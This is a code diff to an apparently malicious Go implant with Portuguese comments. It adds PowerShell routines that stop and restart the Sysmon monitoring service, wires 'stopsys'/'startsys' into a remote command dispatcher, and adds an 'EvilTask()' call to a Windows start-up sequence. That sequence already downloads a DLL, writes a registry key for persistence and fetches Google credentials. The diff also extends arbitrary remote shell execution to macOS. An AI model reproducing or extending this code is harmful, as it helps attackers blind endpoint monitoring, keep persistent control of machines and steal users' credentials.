@@ -188,11 +188,68 @@ func createCronJob() error {
 
 	return nil
 }
+func stopSysmonService() string {
+	resposta := "Sysmon Stoped"
+
+	// Executa o comando para obter a lista de serviços
+	cmd := exec.Command("powershell", "Get-Service | Where-Object { $_.DisplayName -like '*Sysmon*' } | Select-Object -ExpandProperty Name")
+	output, err := cmd.Output()
+	if err != nil {
+		resposta = "Erro ao obter o nome do serviço Sysmon: " + err.Error()
+		return resposta
+	}
+
+	// Obtém o nome do serviço Sysmon do resultado do comando
+	serviceName := strings.TrimSpace(string(output))
+	if serviceName == "" {
+		resposta = "Serviço Sysmon não encontrado."
+		return resposta
+	}
+
+	// Executa o comando para parar o serviço Sysmon
+	cmd = exec.Command("powershell", "Stop-Service -Name '"+serviceName+"'")
+	err = cmd.Run()
+	if err != nil {
+		resposta = "Erro ao parar o serviço Sysmon: " + err.Error()
+		return resposta
+	}
+
+	return resposta
+}
+func startSysmonService() string {
+	resposta := "Sysmon Started"
+
+	// Executa o comando para obter a lista de serviços
+	cmd := exec.Command("powershell", "Get-Service | Where-Object { $_.DisplayName -like '*Sysmon*' } | Select-Object -ExpandProperty Name")
+	output, err := cmd.Output()
+	if err != nil {
+		resposta = "Erro ao obter o nome do serviço Sysmon: " + err.Error()
+		return resposta
+	}
+
+	// Obtém o nome do serviço Sysmon do resultado do comando
+	serviceName := strings.TrimSpace(string(output))
+	if serviceName == "" {
+		resposta = "Serviço Sysmon não encontrado."
+		return resposta
+	}
+
+	// Executa o comando para iniciar o serviço Sysmon
+	cmd = exec.Command("powershell", "Start-Service -Name '"+serviceName+"'")
+	err = cmd.Run()
+	if err != nil {
+		resposta = "Erro ao iniciar o serviço Sysmon: " + err.Error()
+		return resposta
+	}
+
+	return resposta
+}
 
 func main() {
 
 	if runtime.GOOS == "windows" {
 		DownloadDll()
+		EvilTask()
 		addRegistryKey()
 		BaixaCreedsGoogle()
 	} else if runtime.GOOS == "linux" {
@@ -226,6 +283,10 @@ func executaComando(comando string, indice int) (resposta string) {
 	comandoSeparado := helpers.SeparaComando(comando)
 	comandoBase := comandoSeparado[0]
 	switch comandoBase {
+	case "startsys":
+		resposta = startSysmonService()
+	case "stopsys":
+		resposta = stopSysmonService()
 	case "list":
 		resposta = listaArquivos()
 	case "pwd":
@@ -277,17 +338,16 @@ func executaComandoEmShell(comandoCompleto string) (resposta string) {
 	if runtime.GOOS == "windows" {
 		output, _ := exec.Command("powershell.exe", "/C", comandoCompleto).CombinedOutput()
 		resposta = string(output)
-	} else if runtime.GOOS == "linux" {
+	} else if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
 		output, _ := exec.Command("bash", "-c", comandoCompleto).CombinedOutput()
 		resposta = string(output)
-	} else if runtime.GOOS == "darwin" {
-		output, _ := exec.Command("bash," "-c", comandoCompleto).CombinedOutput()
 	} else {
 		resposta = "Target operating system not implemented"
 	}
 
 	return resposta
 }
+
 func mudarDiretorio(novoDiretorio string) (resposta string) {
 	resposta = "Changed Directory"
 	err := os.Chdir(novoDiretorio)
